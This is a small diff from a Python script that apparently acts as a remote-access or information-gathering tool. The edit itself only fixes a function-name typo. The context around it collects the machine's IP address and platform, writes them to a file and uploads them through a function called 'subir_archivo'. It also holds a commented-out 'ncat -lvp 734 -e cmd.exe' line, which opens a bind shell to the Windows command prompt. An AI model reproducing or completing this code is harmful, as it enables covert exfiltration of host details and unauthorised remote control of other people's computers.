@@ -63,7 +63,7 @@ def run():
         print('Windows: ', sysconfig.get_platform(),' === CONNECTED ') 
         print('Address ip: ', IPAddr)
         stmnt= 'Info: '+ IPAddr+'    |   '+sysconfig.get_platform()
-        creare_file("data.txt",stmnt)
+        create_file("data.txt",stmnt)
         subir_archivo('info.txt', stmnt )
         
         #os.system('ncat -lvp 734 -e cmd.exe')
